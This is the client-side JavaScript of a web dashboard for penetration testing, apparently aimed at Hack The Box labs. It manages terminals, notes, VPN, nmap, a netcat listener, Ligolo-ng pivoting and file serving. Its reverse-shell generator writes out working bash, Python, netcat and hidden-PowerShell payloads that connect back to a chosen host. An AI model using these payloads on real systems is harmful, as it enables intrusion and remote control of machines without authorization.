document.addEventListener('DOMContentLoaded', () => {
    const socket = io();
    const terminals = {}; // term_id -> { term, fit, el }
    let activeTermId = null;
    let termCounter = 0;

    // Workspace State
    let currentWorkspaceId = localStorage.getItem('currentWorkspaceId');
    let currentNoteId = null;

    const sessionList = document.getElementById('session-list');
    const terminalsWrapper = document.getElementById('terminals-wrapper');

    // --- Workspace & Notes Logic ---
    function loadWorkspaces() {
        const select = document.getElementById('workspace-select');
        fetch('/api/workspaces')
            .then(r => r.json())
            .then(data => {
                select.innerHTML = '';
                if (data.length === 0) {
                     const opt = document.createElement('option');
                     opt.text = "No Workspaces";
                     select.add(opt);
                }
                data.forEach(w => {
                    const opt = document.createElement('option');
                    opt.value = w.id;
                    opt.text = w.name;
                    select.add(opt);

                    if (currentWorkspaceId && parseInt(currentWorkspaceId) === w.id) {
                        select.value = w.id;
                    }
                });

                if (!currentWorkspaceId && data.length > 0) {
                    select.value = data[0].id;
                    currentWorkspaceId = data[0].id;
                    localStorage.setItem('currentWorkspaceId', currentWorkspaceId);
                }

                if (currentWorkspaceId) loadNotes();
            });
    }

    document.getElementById('workspace-select').addEventListener('change', (e) => {
        currentWorkspaceId = e.target.value;
        localStorage.setItem('currentWorkspaceId', currentWorkspaceId);
        loadNotes();
    });

    document.getElementById('btn-create-workspace').addEventListener('click', () => {
        const name = prompt("New Workspace Name:");
        if (name) {
            fetch('/api/workspaces', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({name: name})
            })
            .then(r => r.json())
            .then(data => {
                currentWorkspaceId = data.id;
                localStorage.setItem('currentWorkspaceId', currentWorkspaceId);
                loadWorkspaces();
            });
        }
    });

    function loadNotes() {
        if (!currentWorkspaceId) return;
        fetch(`/api/workspaces/${currentWorkspaceId}/notes`)
            .then(r => r.json())
            .then(notes => {
                const list = document.getElementById('notes-list');
                list.innerHTML = '';
                notes.forEach(n => {
                    const item = document.createElement('button');
                    item.className = 'list-group-item list-group-item-action bg-black text-light border-secondary small-font p-1';
                    item.innerText = n.title;
                    item.onclick = () => openNote(n);
                    list.appendChild(item);
                });
            });
    }

    function openNote(note) {
        currentNoteId = note.id;
        document.getElementById('note-title').value = note.title;
        document.getElementById('note-content').value = note.content || '';
        document.getElementById('note-editor').style.display = 'flex';
    }

    document.getElementById('btn-new-note').addEventListener('click', () => {
        if (!currentWorkspaceId) {
             alert("Select a workspace first");
             return;
        }
        const title = prompt("Note Title:");
        if (title) {
            fetch(`/api/workspaces/${currentWorkspaceId}/notes`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({title: title})
            })
            .then(r => r.json())
            .then(note => {
                loadNotes();
                openNote(note);
            });
        }
    });

    document.getElementById('btn-save-note').addEventListener('click', () => {
        if (currentNoteId) {
            const title = document.getElementById('note-title').value;
            const content = document.getElementById('note-content').value;
            fetch(`/api/notes/${currentNoteId}`, {
                method: 'PUT',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({title: title, content: content})
            })
            .then(r => r.json())
            .then(() => {
                loadNotes(); // Refresh title if changed
            });
        }
    });

    // --- Helpers ---
    function getVars() {
        return {
            RHOST: document.getElementById('var-rhost').value || '127.0.0.1',
            LHOST: document.getElementById('var-lhost').value || '127.0.0.1'
        };
    }

    function checkVpnStatus() {
        fetch('/api/tools/vpn/status')
            .then(r => r.json())
            .then(data => {
                const badge = document.getElementById('vpn-status-badge');
                if (data.running) {
                    badge.className = 'badge bg-success me-2';
                    badge.innerText = 'VPN: Connected';
                } else {
                    badge.className = 'badge bg-secondary me-2';
                    badge.innerText = 'VPN: Disconnected';
                }
            });
    }

    function updateWebDAVUI(statusData) {
        const btn = document.getElementById('btn-webdav-toggle');
        const statusDiv = document.getElementById('webdav-status');
        const portInput = document.getElementById('webdav-port');

        if (statusData.running) {
            btn.classList.remove('btn-outline-warning');
            btn.classList.add('btn-warning');
            btn.innerText = 'Stop';
            portInput.value = statusData.port;
            portInput.disabled = true;
            statusDiv.innerHTML = `Running: ${statusData.port}`;
        } else {
            btn.classList.add('btn-outline-warning');
            btn.classList.remove('btn-warning');
            btn.innerText = 'Start';
            portInput.disabled = false;
            statusDiv.innerText = 'Stopped';
        }
    }

    function updateHttpUI(statusData) {
        const btn = document.getElementById('btn-http-toggle');
        const statusDiv = document.getElementById('http-status');
        const portInput = document.getElementById('http-port');

        if (statusData.running) {
            btn.classList.remove('btn-outline-warning');
            btn.classList.add('btn-warning');
            btn.innerText = 'Stop';
            portInput.value = statusData.port;
            portInput.disabled = true;
            statusDiv.innerHTML = `Running: ${statusData.port}`;
        } else {
            btn.classList.add('btn-outline-warning');
            btn.classList.remove('btn-warning');
            btn.innerText = 'Start';
            portInput.disabled = false;
            statusDiv.innerText = 'Stopped';
        }
    }

    // --- File Manager ---
    function loadFiles() {
        fetch('/api/files')
        .then(r => r.json())
        .then(files => {
            const tbody = document.getElementById('file-list-body');
            tbody.innerHTML = '';
            files.forEach(f => {
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td class="text-truncate" style="max-width: 150px;" title="${f.name}">${f.name}</td>
                    <td>${(f.size / 1024).toFixed(1)} KB</td>
                    <td class="text-end">
                        <button class="btn btn-sm btn-outline-danger py-0" style="font-size: 0.65rem;" onclick="deleteFile('${f.name}')">Del</button>
                    </td>
                `;
                tbody.appendChild(tr);
            });
        });
    }

    window.deleteFile = function(filename) {
        if(confirm(`Delete ${filename}?`)) {
            fetch(`/api/files/${filename}`, { method: 'DELETE' })
            .then(() => loadFiles());
        }
    };

    document.getElementById('btn-refresh-files').addEventListener('click', loadFiles);

    document.getElementById('btn-upload-file').addEventListener('click', () => {
        const input = document.getElementById('file-upload-input');
        if(input.files.length > 0) {
            const formData = new FormData();
            formData.append('file', input.files[0]);
            fetch('/api/files', { method: 'POST', body: formData })
            .then(r => r.json())
            .then(() => {
                loadFiles();
                input.value = '';
            });
        }
    });

    // Auto-refresh files when tab is shown
    document.getElementById('tab-btn-files').addEventListener('shown.bs.tab', loadFiles);


    // --- Terminals ---

    function createTerminal(termId, initialCommand) {
        if (!termId) {
            termCounter++;
            termId = `term_${termCounter}`;
        }

        // Create DOM Element
        const el = document.createElement('div');
        el.className = 'terminal-instance h-100 w-100';
        el.style.display = 'none';
        terminalsWrapper.appendChild(el);

        // Create Xterm
        const term = new Terminal({
            cursorBlink: true,
            fontFamily: 'Menlo, Monaco, "Courier New", monospace',
            fontSize: 14,
            convertEol: true,
            theme: { background: '#000000', foreground: '#ffffff' }
        });

        const fitAddon = new FitAddon.FitAddon();
        term.loadAddon(fitAddon);
        term.open(el);

        // Store session
        terminals[termId] = { term, fit: fitAddon, el };

        // Bind events
        term.onData(data => socket.emit('input', { input: data, term_id: termId }));

        // Create Sidebar Tab
        const tab = document.createElement('div');
        tab.className = 'list-group-item list-group-item-action border-0 text-light mb-1 d-flex justify-content-between align-items-center';
        tab.style.cursor = 'pointer';
        tab.dataset.termId = termId;

        const label = document.createElement('span');
        label.className = 'text-truncate me-2';
        label.style.maxWidth = '120px';
        if (termId === 'default') {
            label.innerText = 'Local / Control';
        } else if (initialCommand && initialCommand.startsWith('ssh')) {
             // Try to parse IP/Host from ssh command
             const parts = initialCommand.split(' ');
             const target = parts[parts.length - 1];
             label.innerText = target;
        } else {
            label.innerText = `Terminal ${termCounter}`;
        }
        tab.appendChild(label);

        // Rename on double click
        label.addEventListener('dblclick', (e) => {
            e.stopPropagation();
            const newName = prompt("Rename tab:", label.innerText);
            if(newName) label.innerText = newName;
        });

        // Controls container
        const controls = document.createElement('div');

        // Archive button
        const archiveBtn = document.createElement('i');
        archiveBtn.className = 'bi bi-save text-light me-2';
        archiveBtn.style.fontSize = '0.8rem';
        archiveBtn.title = 'Archive Terminal';
        archiveBtn.onclick = (e) => {
             e.stopPropagation();
             archiveTerminal(termId);
        };
        controls.appendChild(archiveBtn);

        // Close button
        const closeBtn = document.createElement('i');
        closeBtn.className = 'bi bi-x-lg text-light';
        closeBtn.style.fontSize = '0.8rem';
        closeBtn.onclick = (e) => {
            e.stopPropagation();
            if(confirm('Close this terminal?')) {
                closeTerminal(termId);
            }
        };
        controls.appendChild(closeBtn);

        tab.appendChild(controls);

        tab.onclick = () => setActiveTerminal(termId);
        sessionList.appendChild(tab);

        // Activate immediately
        setActiveTerminal(termId);

        // Wait for element to be visible/layout before fitting
        requestAnimationFrame(() => {
             fitAddon.fit();
             const cmd = initialCommand ? [initialCommand + "\n"] : ["/bin/bash"];
             // If it's a raw command string passed to bash, we might want to just run bash then write to it,
             // or spawn the process directly.
             // PTYManager expects a list for spawn.
             // Simplest approach: Spawn bash, then write the command if provided.

             socket.emit('start_terminal', { term_id: termId, cols: term.cols, rows: term.rows });

             if (initialCommand) {
                 // Wait a tiny bit for the shell to be ready
                 setTimeout(() => {
                     socket.emit('input', { term_id: termId, input: initialCommand + "\n" });
                 }, 500);
             }
        });
    }

    function closeTerminal(termId) {
        if (terminals[termId]) {
            // Remove from DOM
            terminals[termId].el.remove();
            terminals[termId].term.dispose();
            delete terminals[termId];

            // Remove Tab
            const tab = sessionList.querySelector(`[data-term-id="${termId}"]`);
            if (tab) tab.remove();

            // Notify backend (optional, if we want to kill process explicitly)
            // But usually closing the socket/disconnect handles it.
            // We can assume the backend keeps it alive until disconnect?
            // Actually, for cleanup we should probably tell the backend.
            // But our current PTYManager doesn't have a specific "kill this term_id" event publicly exposed
            // other than disconnect. Let's rely on the user typing 'exit' or refreshing for now,
            // OR we can just hide it. Ideally we add a 'close_terminal' event.
            // For MVP, we just remove UI.

            // Switch active
            if (activeTermId === termId) {
                const remaining = Object.keys(terminals);
                if (remaining.length > 0) {
                    setActiveTerminal(remaining[remaining.length - 1]);
                } else {
                    activeTermId = null;
                }
            }
        }
    }

    function setActiveTerminal(termId) {
        // Hide current
        if (activeTermId && terminals[activeTermId]) {
            terminals[activeTermId].el.style.display = 'none';
            const oldTab = sessionList.querySelector(`[data-term-id="${activeTermId}"]`);
            if (oldTab) {
                oldTab.classList.remove('active', 'bg-secondary');
                // oldTab.classList.add('bg-dark');
            }
        }

        activeTermId = termId;
        const t = terminals[termId];
        if (t) {
            t.el.style.display = 'block';
            t.fit.fit();
            t.term.focus();

            const newTab = sessionList.querySelector(`[data-term-id="${termId}"]`);
            if (newTab) {
                newTab.classList.add('active', 'bg-secondary');
                // newTab.classList.remove('bg-dark');
            }

            // Re-sync size just in case
            socket.emit('resize', { term_id: termId, cols: t.term.cols, rows: t.term.rows });
        }
    }

    function archiveTerminal(termId) {
        if (!currentWorkspaceId) {
            alert('Select a workspace first');
            return;
        }
        fetch(`/api/terminals/${termId}/archive`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({socket_id: socket.id, workspace_id: currentWorkspaceId})
        })
        .then(r => r.json())
        .then(data => {
            if (data.status === 'archived') {
                alert(`Terminal archived (ID: ${data.id})`);
            } else {
                alert('Error archiving: ' + data.error);
            }
        });
    }

    // --- Socket Events ---
    socket.on('connect', () => {
        const socketStatus = document.getElementById('socket-status');
        if (socketStatus) {
            socketStatus.className = 'badge bg-success border border-success p-1';
            socketStatus.title = 'Connected';
        }

        loadWorkspaces();

        if (Object.keys(terminals).length === 0) {
            createTerminal('default');
        }

        // Fetch statuses
        fetch('/api/tools/webdav/status')
            .then(r => r.json())
            .then(data => updateWebDAVUI(data));

        fetch('/api/tools/http/status')
            .then(r => r.json())
            .then(data => updateHttpUI(data));

        fetch('/api/tools/vpn/list')
            .then(r => r.json())
            .then(data => {
                const sel = document.getElementById('vpn-config-select');
                sel.innerHTML = '<option value="">Select VPN...</option>';
                data.configs.forEach(c => {
                    const opt = document.createElement('option');
                    opt.value = c;
                    opt.innerText = c;
                    sel.appendChild(opt);
                });
            });

        // Check VPN Status periodically
        setInterval(checkVpnStatus, 5000);
        checkVpnStatus();
    });

    socket.on('output', data => {
        if (data.term_id && terminals[data.term_id]) {
            let out = data.output;
            // Simple Highlighting using ANSI codes
            // Note: This is fragile if output is split across packets, but good enough for MVP

            // Highlight HTB{...} in Magenta
            out = out.replace(/(HTB\{.*?\})/g, '\x1b[35m$1\x1b[0m');

            // Highlight IP addresses in Cyan
            // out = out.replace(/(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)/g, '\x1b[36m$1\x1b[0m');

            terminals[data.term_id].term.write(out);
        }
    });

    socket.on('disconnect_terminal', data => {
        // Backend says process died
        if (data.term_id) {
             terminals[data.term_id].term.write('\r\n\x1b[31m[Process Exited]\x1b[0m\r\n');
        }
    });

    socket.on('disconnect', () => {
        const socketStatus = document.getElementById('socket-status');
        if (socketStatus) {
            socketStatus.className = 'badge bg-danger border border-danger p-1';
            socketStatus.title = 'Disconnected';
        }
    });

    window.addEventListener('resize', () => {
        if (activeTermId && terminals[activeTermId]) {
            terminals[activeTermId].fit.fit();
            const t = terminals[activeTermId];
            socket.emit('resize', { term_id: activeTermId, cols: t.term.cols, rows: t.term.rows });
        }
    });

    // --- Buttons ---
    document.getElementById('btn-new-term').addEventListener('click', () => createTerminal());

    // WebDAV
    document.getElementById('btn-webdav-toggle').addEventListener('click', () => {
        const port = document.getElementById('webdav-port').value;
        fetch('/api/tools/webdav/toggle', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({port: port})
        })
        .then(r => r.json())
        .then(data => updateWebDAVUI(data.details));
    });

    // HTTP Server
    document.getElementById('btn-http-toggle').addEventListener('click', () => {
        const port = document.getElementById('http-port').value;
        fetch('/api/tools/http/toggle', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({port: port})
        })
        .then(r => r.json())
        .then(data => updateHttpUI(data.details));
    });

    // VPN
    document.getElementById('btn-vpn-connect').addEventListener('click', () => {
        const config = document.getElementById('vpn-config-select').value;
        if(config && activeTermId && terminals[activeTermId]) {
            terminals[activeTermId].term.write(`\r\n\x1b[33m[System] Starting VPN (${config})...\x1b[0m\r\n`);
            socket.emit('input', { term_id: activeTermId, input: `sudo openvpn --config "${config}"\n` });
        } else {
            alert('Select a VPN config and ensure a terminal is active.');
        }
    });

    // Nmap
    document.getElementById('btn-nmap-run').addEventListener('click', () => {
        let cmd = document.getElementById('nmap-command').value;
        const vars = getVars();
        cmd = cmd.replace(/{RHOST}/g, vars.RHOST).replace(/{LHOST}/g, vars.LHOST);

        if(cmd && activeTermId && terminals[activeTermId]) {
             terminals[activeTermId].term.write(`\r\n\x1b[32m[System] Running: ${cmd}\x1b[0m\r\n`);
             // Pipe to tee for saving with unique ID based on terminal
             const outFile = `/tmp/nmap_scan_${activeTermId}.txt`;
             const fullCmd = `${cmd} | tee ${outFile}\n`;
             socket.emit('input', { term_id: activeTermId, input: fullCmd });
        }
    });

    document.getElementById('btn-nmap-save').addEventListener('click', () => {
        if (!currentWorkspaceId) {
             alert("Select a workspace first");
             return;
        }
        if (!activeTermId) {
            alert("No active terminal selected");
            return;
        }
        fetch('/api/tools/nmap/save', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                workspace_id: currentWorkspaceId,
                term_id: activeTermId
            })
        })
        .then(r => r.json())
        .then(data => {
             if (data.status === 'saved') {
                 loadNotes();
                 alert('Scan saved as note');
             } else {
                 alert('Error saving scan: ' + (data.error || 'Unknown'));
             }
        });
    });

    // Netcat Listener
    document.getElementById('btn-nc-listen').addEventListener('click', () => {
        const port = document.getElementById('nc-port').value;
        if(port && activeTermId && terminals[activeTermId]) {
             terminals[activeTermId].term.write(`\r\n\x1b[33m[System] Starting Netcat Listener on ${port}...\x1b[0m\r\n`);
             socket.emit('input', { term_id: activeTermId, input: `nc -lvnp ${port}\n` });
        } else {
            alert('Ensure a port is set and terminal is active.');
        }
    });

    // Ligolo-ng Proxy
    document.getElementById('btn-ligolo-proxy').addEventListener('click', () => {
        if(activeTermId && terminals[activeTermId]) {
             terminals[activeTermId].term.write(`\r\n\x1b[36m[System] Starting Ligolo Proxy...\x1b[0m\r\n`);
             socket.emit('input', { term_id: activeTermId, input: `sudo ligolo-proxy -selfcert\n` });
        } else {
            alert('Ensure a terminal is active.');
        }
    });

    // Ligolo-ng Agent Connect
    document.getElementById('btn-ligolo-agent').addEventListener('click', () => {
        if(activeTermId && terminals[activeTermId]) {
             const server = prompt("Ligolo Proxy Server (IP:Port):", "127.0.0.1:11601");
             if(server) {
                 terminals[activeTermId].term.write(`\r\n\x1b[36m[System] Connecting Ligolo Agent to ${server}...\x1b[0m\r\n`);
                 socket.emit('input', { term_id: activeTermId, input: `./agent -connect ${server} -ignore-cert\n` });
             }
        } else {
            alert('Ensure a terminal is active.');
        }
    });

    // Quick SSH
    document.getElementById('btn-quick-ssh').addEventListener('click', () => {
        const target = document.getElementById('ssh-target').value;
        if (target) {
            const cmd = `ssh ${target}`;
            createTerminal(null, cmd);
        }
    });

    // Snippets
    document.querySelectorAll('.snippet-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            let cmd = btn.dataset.cmd;
            const vars = getVars();
            cmd = cmd.replace(/{RHOST}/g, vars.RHOST).replace(/{LHOST}/g, vars.LHOST);

            if(activeTermId && terminals[activeTermId]) {
                socket.emit('input', { term_id: activeTermId, input: cmd + "\n" });
            } else {
                alert('No active terminal');
            }
        });
    });

    // RevShell Generator
    function updateRevShell() {
        const type = document.getElementById('revshell-type').value;
        const vars = getVars();
        const port = 4444; // Default or could use input
        let shell = '';

        switch(type) {
            case 'bash':
                shell = `bash -i >& /dev/tcp/${vars.LHOST}/${port} 0>&1`;
                break;
            case 'python':
                shell = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${vars.LHOST}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`;
                break;
            case 'nc':
                shell = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${vars.LHOST} ${port} >/tmp/f`;
                break;
            case 'powershell':
                shell = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${vars.LHOST}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
                break;
        }
        document.getElementById('revshell-output').value = shell;
    }

    document.getElementById('revshell-type').addEventListener('change', updateRevShell);
    ['var-rhost', 'var-lhost'].forEach(id => {
        document.getElementById(id).addEventListener('input', updateRevShell);
    });

    // Initialize
    updateRevShell();

    document.getElementById('btn-copy-revshell').addEventListener('click', () => {
        const text = document.getElementById('revshell-output').value;
        navigator.clipboard.writeText(text);

        // Also auto-type if desired? No, better just copy.
        const btn = document.getElementById('btn-copy-revshell');
        const orig = btn.innerText;
        btn.innerText = 'Copied!';
        setTimeout(() => btn.innerText = orig, 1500);
    });

    // --- Split.js Initialization ---
    // Horizontal Split: Left Sidebar | Center | Right Tools
    Split(['#left-sidebar', '#center-panel', '#right-panel'], {
        sizes: [15, 84, 1], // Minimize Right Panel
        minSize: [150, 400, 180],
        gutterSize: 5,
        cursor: 'col-resize',
        onDragEnd: () => {
            if (activeTermId && terminals[activeTermId]) {
                terminals[activeTermId].fit.fit();
                const t = terminals[activeTermId];
                socket.emit('resize', { term_id: activeTermId, cols: t.term.cols, rows: t.term.rows });
            }
        },
        onDrag: () => {
             if (activeTermId && terminals[activeTermId]) {
                terminals[activeTermId].fit.fit();
            }
        }
    });

    // Vertical Split: Terminals | Notes
    Split(['#terminals-wrapper', '#notes-wrapper'], {
        direction: 'vertical',
        sizes: [70, 30],
        minSize: [100, 100],
        gutterSize: 5,
        cursor: 'row-resize',
        onDragEnd: () => {
             if (activeTermId && terminals[activeTermId]) {
                terminals[activeTermId].fit.fit();
                const t = terminals[activeTermId];
                socket.emit('resize', { term_id: activeTermId, cols: t.term.cols, rows: t.term.rows });
            }
        },
         onDrag: () => {
             if (activeTermId && terminals[activeTermId]) {
                terminals[activeTermId].fit.fit();
            }
        }
    });
});
